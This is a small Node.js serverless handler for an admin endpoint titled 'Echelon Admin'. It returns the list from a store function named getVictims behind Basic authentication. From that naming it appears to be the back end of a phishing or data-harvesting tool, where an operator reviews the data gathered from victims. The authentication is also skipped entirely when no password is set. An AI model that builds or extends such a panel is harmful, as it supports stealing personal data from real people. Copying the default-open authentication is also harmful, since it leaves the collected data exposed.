const store = require('./_store');

// ── admin auth (Basic) — GET requires ADMIN_PASSWORD when set ──
const ADMIN_USER = 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';
function checkAdminAuth(req) {
  if (!ADMIN_PASSWORD) return true;
  const h = req.headers['authorization'] || '';
  if (!h.startsWith('Basic ')) return false;
  try {
    const dec = Buffer.from(h.slice(6), 'base64').toString('utf-8');
    const i = dec.indexOf(':');
    return i !== -1 && dec.slice(0, i) === ADMIN_USER && dec.slice(i + 1) === ADMIN_PASSWORD;
  } catch (e) { return false; }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.statusCode = 204; return res.end(); }
  if (req.method !== 'GET') {
    res.statusCode = 405;
    return res.end(JSON.stringify({ ok: false }));
  }
  if (!checkAdminAuth(req)) {
    res.statusCode = 401;
    res.setHeader('WWW-Authenticate', 'Basic realm="Echelon Admin", charset="UTF-8"');
    return res.end(JSON.stringify({ ok: false }));
  }
  res.setHeader('Content-Type', 'application/json');
  const list = await store.getVictims();
  res.end(JSON.stringify(list));
};
